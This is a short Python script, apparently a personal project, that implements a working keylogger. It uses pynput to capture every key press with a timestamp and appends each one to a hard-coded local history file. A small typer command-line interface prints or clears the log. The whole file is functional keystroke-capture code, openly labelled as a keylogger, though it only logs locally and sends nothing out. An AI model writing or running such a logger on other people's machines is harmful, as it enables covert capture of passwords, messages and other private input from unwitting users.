from pynput.keyboard import Listener
import typer
import datetime as dt

app = typer.Typer()
file = open('/Users/vedantarora/keylogger/history.txt','a+')
file.write('<----keylogger history---->\n')
file.close()

def on_press (key):
    file = open('/Users/vedantarora/keylogger/history.txt','a+')
    file.write(f"{str(dt.datetime.now())}->{str(key)}\n")
    file.close()
def on_release (key):
    return key

listener = Listener(on_press=on_press,on_release=on_release)
listener.start()

@app.command()
def history():
    file = open('/Users/vedantarora/keylogger/history.txt','r')
    hist = list(file.readlines())
    for i in hist:
        print(f"{i}")
@app.command()
def clearhistory():
    open('/Users/vedantarora/keylogger/history.txt', 'w').close()
    print('history cleared')
if __name__=='__main__':
    app()
